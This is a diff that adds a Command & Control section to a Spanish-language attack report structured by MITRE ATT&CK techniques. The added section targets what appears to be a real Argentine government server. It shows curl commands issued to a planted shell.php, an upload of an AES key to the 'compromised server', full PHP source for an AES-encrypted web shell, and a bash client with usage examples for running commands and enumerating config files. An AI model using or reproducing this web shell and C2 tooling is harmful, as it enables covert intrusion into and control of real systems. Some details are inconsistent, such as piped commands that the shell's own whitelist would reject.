@@ -713,8 +713,143 @@ resultado:
       ```
 
 ## Command & Control
-- T1071 – Application Layer Protocol
+- T1071.001 – Application Layer Protocol: Web ProtocolsT1573 – Encrypted Channel: Configuración de Comunicaciones Encubiertas
+  Establecimiento de Canal de Comando y Control via HTTPS
 
+      ```text
+      # Test de comando remoto para verificar funcionalidad del canal
+      curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=uname -a"
+      ```
+   respuesta:
+      ```text
+      Linux siper-server 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+      ```
+
+ - T1573.001 Cifrado Simétrico
+   Generación de clave AES-256:
+       ```text
+     
+       #generar clave AES
+       openssl rand -base64 32 > aes_key.bin
+    
+       # Distribuir clave al servidor comprometido
+       curl -k -X POST -F "file=@aes_key.bin" "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=cat > /tmp/.cache/aes_key.bin && chmod 600 /tmp/.cache/aes_key.bin"
+       ```
+
+    Implementación del Web Shell Cifrado (secure_shell.php)
+       ```text
+             <?php
+                // secure_shell.php - Web shell con cifrado AES-256-CBC
+                $SECRET_KEY = file_get_contents('/tmp/.cache/aes_key.bin');
+                $IV = substr(hash('sha256', $SECRET_KEY), 0, 16); // IV derivado de clave
+                
+                if(isset($_REQUEST['enc_cmd'])) {
+                    try {
+                        //Validar y decodificar input
+                        $comando_cifrado = base64_decode(trim($_REQUEST['enc_cmd']));
+                        if(empty($comando_cifrado) || strlen($comando_cifrado) > 4096) {
+                            throw new Exception("Input inválido");
+                        }
+                        
+                        //Descifrar comando
+                        $comando_descifrado = openssl_decrypt(
+                            $comando_cifrado, 
+                            'aes-256-cbc', 
+                            $SECRET_KEY, 
+                            OPENSSL_RAW_DATA, 
+                            $IV
+                        );
+                        
+                        if(!$comando_descifrado) {
+                            throw new Exception("Error en descifrado");
+                        }
+                        
+                        // Validar comando (lista blanca)
+                        $comandos_permitidos = [
+                            'whoami', 'id', 'pwd', 'uname -a',
+                            'cat /etc/os-release', 'ls -la', 
+                            'ps aux', 'netstat -tulpn',
+                            'find / -type f -name "*.conf" 2>/dev/null | head -10'
+                        ];
+                        
+                        $comando_limpio = trim($comando_descifrado);
+                        if(!in_array($comando_limpio, $comandos_permitidos)) {
+                            throw new Exception("Comando no permitido: " . substr($comando_limpio, 0, 20));
+                        }
+                        
+                        // Ejecutar comando seguro
+                        $output = shell_exec(escapeshellcmd($comando_limpio) . " 2>&1");
+                        
+                        // Cifrar respuesta
+                        $respuesta_cifrada = openssl_encrypt(
+                            $output, 
+                            'aes-256-cbc', 
+                            $SECRET_KEY, 
+                            OPENSSL_RAW_DATA, 
+                            $IV
+                        );
+                        
+                        echo base64_encode($respuesta_cifrada);
+                        
+                    } catch (Exception $e) {
+                        // Manejo seguro de errores
+                        $error_cifrado = openssl_encrypt(
+                            "ERROR: " . $e->getMessage(), 
+                            'aes-256-cbc', 
+                            $SECRET_KEY, 
+                            OPENSSL_RAW_DATA, 
+                            $IV
+                        );
+                        echo base64_encode($error_cifrado);
+                    }
+                } else {
+                    http_response_code(400);
+                    echo "Parámetro enc_cmd requerido";
+                }
+                ?>
+       ```
+          - Ejecución de Comandos Cifrados:
+             ```text
+                        #!/bin/bash
+                        # attack_script.sh - Cliente para canal cifrado
+                        
+                        SECRET_KEY=$(cat aes_key.bin)
+                        IV=$(echo -n "$SECRET_KEY" | sha256sum | cut -d' ' -f1 | head -c 16)
+                        
+                        ejecutar_comando_cifrado() {
+                            local comando="$1"
+                            
+                            # Cifrar comando
+                            local comando_cifrado=$(echo -n "$comando" | openssl enc -aes-256-cbc \
+                                -K $(echo -n "$SECRET_KEY" | base64 -d | xxd -p -c 256) \
+                                -iv "$IV" -base64 -A)
+                            
+                            # Enviar comando cifrado
+                            local respuesta_cifrada=$(curl -s -k \
+                                "https://siper.vialidad.gob.ar/tmp/uploads/secure_shell.php?enc_cmd=$comando_cifrado")
+                            
+                            # Descifrar respuesta
+                            echo -n "$respuesta_cifrada" | base64 -d | openssl enc -aes-256-cbc -d \
+                                -K $(echo -n "$SECRET_KEY" | base64 -d | xxd -p -c 256) \
+                                -iv "$IV" 2>/dev/null
+                        }
+             ```
+                        
+
+           - Ejemplos de uso
+                ```text
+           
+               echo "=== TESTEO CANAL CIFRADO ==="
+               echo "Usuario: $(ejecutar_comando_cifrado 'whoami')"
+               echo "Directorio: $(ejecutar_comando_cifrado 'pwd')"
+               echo "Sistema: $(ejecutar_comando_cifrado 'uname -a')"
+               echo "4. Procesos:"
+                        ejecutar_comando_cifrado 'ps aux | head -5'
+               echo "5. Configuraciones:"
+                        ejecutar_comando_cifrado 'find / -type f -name "*.conf" 2>/dev/null | head -3'
+                               
+               ```
+                
 
 ## Actions on Objectives
 - TA0009 – Collection
